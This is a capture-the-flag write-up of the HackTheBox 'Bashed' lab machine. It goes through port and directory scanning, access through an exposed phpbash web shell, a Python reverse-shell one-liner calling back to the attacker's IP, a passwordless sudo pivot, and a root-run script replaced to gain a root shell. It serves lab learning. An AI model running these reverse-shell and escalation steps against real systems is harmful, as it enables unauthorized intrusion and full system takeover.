# Hackthebox Bashed

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Mon Nov 26 15:52:51 2018 as: nmap -v -sV -p- -T4 -oA bashed_full_tcp 10.10.10.68
Increasing send delay for 10.10.10.68 from 0 to 5 due to 928 out of 2319 dropped probes since last increase.
Nmap scan report for 10.10.10.68
Host is up (0.075s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

There is only one service listening and it appears to be an apache webserver.


### Content Discovery 


On the site we see that there is a blog post abouth something called phpbash, wich seems to be some form of interactive web shell. There is also a link to a github repo if the project.

In that repo we see a gif with a short how to, that shows the script in a "uploads" folder. 

Doing some content discovery with gobuster I found a couple of interesting directories:

```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.68/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/26 16:22:18 Starting gobuster
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
```

Checking this "uploads" after the php file yielded nothing. But after going through the directories found above I found a phpbash.php under /dev: http://10.10.10.68/dev/phpbash.php

Visiting this pages gives us an interactive shell on the box.


## Initial Compromise

Let's see if we have python on the box.

```
www-data@bashed:/var/www/html/dev# which python

/usr/bin/python
```

Good. so we should be able to execute a Python reverse shell through the php webshell we have:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
root@kali:~/htb/bashed# nc -lvp 80
listening on [any] 80 ...
10.10.10.68: inverse host lookup failed: Unknown host
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.68] 44730
/bin/sh: 0: can't access tty; job control turned off
$
```

## Pivilege Escalation

Once we have a decent shell on the box I move to /dev/shm and upload a privesc script(LinEnum) from my attacking box and run it.


One interesting hit was the following:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

This means that we can run any command as the scriptmanager user. So let's invoke a shell as the user using sudo:

```
www-data@bashed:/$ sudo -u scriptmanager bash -i
sudo -u scriptmanager bash -i
scriptmanager@bashed:/$ id
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
scriptmanager@bashed:/$ 
```

After quite some enumeration I found a directory in the root of the filesystem called "scripts" and that is owned by our new user.

The directory contains two files, a test.py python script and a test.txt test file. The script is just creating the text file, however the created file is owned by root.
This indicates that it is the root user that is executing the script.

 ```
-rwxr-xr-x  1 scriptmanager scriptmanager  228 Nov 26 07:56 test.py
-rw-r--r--  1 root          root            12 Nov 26 07:56 test.txt
```

So I created a new file called test.py that spawned a python reverse shell to my attacking machine.

```
root@kali:~/htb# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.68: inverse host lookup failed: Unknown host
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.68] 55122
bash: cannot set terminal process group (1792): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bashed:/scripts#
```
